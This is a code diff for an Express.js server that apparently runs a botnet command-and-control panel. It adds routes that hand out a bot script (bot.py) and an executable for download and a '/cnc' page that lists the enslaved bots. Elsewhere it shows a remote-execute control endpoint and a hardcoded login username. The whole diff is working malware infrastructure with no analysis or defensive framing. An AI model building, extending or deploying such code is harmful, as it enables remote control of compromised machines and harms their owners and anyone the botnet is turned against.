@@ -20,6 +20,16 @@ exec.exec('python refresh.py',(error,stdout,stderr) => {
     botnet = stdout.split(',');
 });
 
+app.get('/script',function(req,resp){
+    c_file = __dirname + '/bot.py'
+    resp.download(c_file)
+})
+
+app.get('/download',function(req,resp){
+    c_file = __dirname + '/pyinstaller.exe';
+    resp.download(c_file)
+})
+
 app.use('/',express.static('./public'));
 
 app.post('/control/execute',urlEncodedParser,function(req,resp){
@@ -55,6 +65,16 @@ app.get('/control',function(req,resp){
         resp.render('error');
     }
 });
+
+app.get('/cnc',function(req,resp){
+    exec.exec('python refresh.py',(error,stdout,stderr) => {
+        botnet = stdout.split(',');
+        botnet[botnet.length - 1] = botnet[botnet.length-1].trim()
+        // console.log(botnet);
+        // console.log('Responding...');
+        resp.render('CnC',{'bots':botnet});
+    })
+})
 
 app.post('/login',urlEncodedParser,function(req,resp){
     if (req.body.username === 'baapo'){
